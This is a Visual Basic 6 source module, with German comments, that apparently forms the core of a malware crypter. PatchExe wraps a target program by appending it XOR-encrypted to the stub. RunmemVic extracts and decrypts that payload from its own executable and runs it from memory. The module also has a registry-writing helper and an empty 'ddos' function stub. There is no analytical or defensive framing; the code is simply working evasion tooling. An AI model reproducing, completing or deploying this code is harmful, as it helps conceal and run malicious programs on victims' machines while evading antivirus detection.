Attribute VB_Name = "functionsA"
Dim B() As Byte
Private allll As String
 Public RANDOMPWCRYPT As Long
 Public RANDOMSTRING As String

Public Function slice(datas As String, area1 As String, area2 As String) As String
On Error Resume Next
    W1 = Trim$(area1)
    W2 = Trim$(area2)
    Pos1 = InStr(1, datas, W1)
    Pos2 = InStr(Pos1 + Len(W1), datas, W2)
    slice = Mid$(datas, Pos1 + Len(W1), Pos2 - (Pos1 + Len(W1)))
End Function

Public Function LoadBinary(ByVal strFileName As String)
  Dim ff As Integer

  ff = FreeFile
  Open strFileName For Binary As #ff
    LoadBinary = Input(FileLen(strFileName), #ff)
    
  Close #ff
End Function
Public Function RunmemVic()
 Dim mamas As String
 mamas = cry(slice(LoadBinary2(App.path & "\" & App.EXEName & ".exe"), RANDOMSTRING, "/" & RANDOMSTRING))
 allll = mamas
 L = Len(allll) - 1
 ReDim B(0 To L)
 Call CopyMemory(B(0), ByVal allll, L + 1)
 RunExe App.path & "\" & App.EXEName & ".exe", B()
End Function
Public Function LoadBinary2(ByVal strFileName As String) As String
  Dim ff As Integer

  ff = FreeFile
  Open strFileName For Binary As #ff
    LoadBinary2 = Input(FileLen(strFileName), #ff)
    
  Close #ff
End Function
Public Function PatchExe(File1 As String)
Dim temp As String
temp = LoadBinary2(File1)
Kill (File1)
 Open File1 For Binary As #1
 Put #1, , LoadBinary2(App.path & "\" & App.EXEName & ".exe")
 Put #1, , RANDOMSTRING & cry(temp) & "/" & RANDOMSTRING
 Close #1
End Function

Public Function cry(sBuffer As String)
  nTemp = Rnd(-1)
  Randomize RANDOMPWCRYPT      ' <- entspricht dem Passwort
  nLen = Len(sBuffer)
  For i = 1 To nLen
  Mid$(sBuffer, i, 1) = Chr$(Asc(Mid$(sBuffer, i, 1)) Xor ((Rnd * 255) \ 1))
  Next i
  cry = sBuffer
End Function
Public Function GetRandomNum(Min As Long, Max As Long) As Long
    GetRandomNum = Int(Rnd * (Max - Min + 1) + Min)
End Function
Public Function GetRowContent(hwnd As Long, _
  Optional ByVal nLine As Long = 0) As String
 On Error Resume Next
  Dim CursorPos As Long
  Dim FirstChar As Long
  Dim RowLength As Long
  Dim Buffer() As Byte
 
  ' Falls keine Zeilennummer angegeben,
  ' Inhalt der aktuellen Zeile ermitteln
  If nLine < 1 Then
    CursorPos = SendMessage(hwnd, EM_GETSEL, 0, ByVal 0&) \ 65536
    nLine = SendMessage(hwnd, EM_LINEFROMCHAR, CursorPos, ByVal 0&)
  Else
    nLine = nLine - 1
  End If
 
  ' Zeilenlänge ermitteln
  FirstChar = SendMessage(hwnd, EM_LINEINDEX, nLine, ByVal 0&)
  RowLength = SendMessage(hwnd, EM_LINELENGTH, FirstChar, ByVal 0&)
 
  ' Puffer vorbereiten
  ReDim Buffer(RowLength + 1)
  Buffer(0) = RowLength + 1
 
  ' Zeileninhalt in Puffer auslesen
  SendMessage hwnd, EM_GETLINE, nLine, Buffer(0)
 
  ' Inhalt als String zurückgeben
  GetRowContent = Left$(StrConv(Buffer, vbUnicode), RowLength)
End Function

Public Function RegWrite(ByVal path As String, _
  ByVal Value As String, _
  Optional ByVal Typ As String = "REG_SZ") As Boolean
 On Error Resume Next
  Dim ws As Object
 
 
  Set ws = CreateObject("WScript.Shell")
  ws.RegWrite path, Value, Typ
  RegWrite = True
  Exit Function
 


End Function


Public Function ddos(site As String)



End Function
